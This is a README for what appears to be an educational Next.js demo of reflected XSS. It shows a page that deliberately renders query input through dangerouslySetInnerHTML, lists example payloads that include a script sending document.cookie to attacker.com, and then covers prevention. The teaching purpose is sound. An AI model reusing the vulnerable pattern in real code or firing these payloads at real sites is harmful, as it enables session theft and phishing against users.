# XSS Vulnerability Demo

**WARNING: This is an educational demonstration of security vulnerabilities. NEVER deploy this to production!**

## Overview

This Next.js application demonstrates Cross-Site Scripting (XSS) vulnerabilities, specifically reflected XSS attacks. It's designed for educational purposes to help developers understand how XSS attacks work and how to prevent them.

## Features

### 1. **Reflected XSS Vulnerability**
The `/vulnerable` page intentionally uses `dangerouslySetInnerHTML` to render user input from URL query parameters without sanitization.

## Getting Started

### Installation

```bash
# Install dependencies
pnpm install

# Run the development server
pnpm dev
```

Open [http://localhost:3000](http://localhost:3000) in your browser.

## How It Works

### The Vulnerability

The vulnerable page uses `dangerouslySetInnerHTML`:

```tsx
<div 
  dangerouslySetInnerHTML={{ __html: `Welcome, ${name}!` }}
/>
```

This renders **raw HTML** from the URL query parameter without any sanitization, allowing attackers to inject malicious scripts.

### Example Attacks

1. **Simple Alert:**
   ```
   /vulnerable?name=<script>alert('XSS')</script>
   ```

2. **Phishing:**
   ```
   /vulnerable?name=<div style="...">fake login form</div>
   ```

3. **Cookie Theft:**
   ```
   /vulnerable?name=<script>fetch('https://attacker.com?cookie=' + document.cookie)</script>
   ```

## Prevention Methods

### ✅ Do This:

1. **Use React's Default Escaping:**
   ```tsx
   <div>Welcome, {name}!</div>
   ```
   React automatically escapes values in JSX.

2. **Sanitize User Input:**
   ```tsx
   import DOMPurify from 'dompurify';
   const clean = DOMPurify.sanitize(dirty);
   ```

3. **Content Security Policy (CSP):**
   ```tsx
   // next.config.js
   headers: [
     {
       key: 'Content-Security-Policy',
       value: "script-src 'self'"
     }
   ]
   ```

4. **HttpOnly Cookies:**
   ```tsx
   Set-Cookie: sessionId=abc123; HttpOnly; Secure
   ```

### ❌ Never Do This:

- Use `dangerouslySetInnerHTML` with user input
- Insert user data directly into HTML without escaping
- Trust client-side validation alone
- Store sensitive data in client-accessible cookies

## Educational Use Only

This project is for:
- Learning about web security
- Understanding XSS attack vectors
- Teaching secure coding practices

**DO NOT:**
- Use these patterns in real applications
- Test on websites you don't own
- Use for malicious purposes

## Technologies

- Next.js 15.5
- React 19.1
- TypeScript
- Tailwind CSS

## Resources

- [OWASP XSS Guide](https://owasp.org/www-community/attacks/xss/)
- [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [React Security Best Practices](https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html)
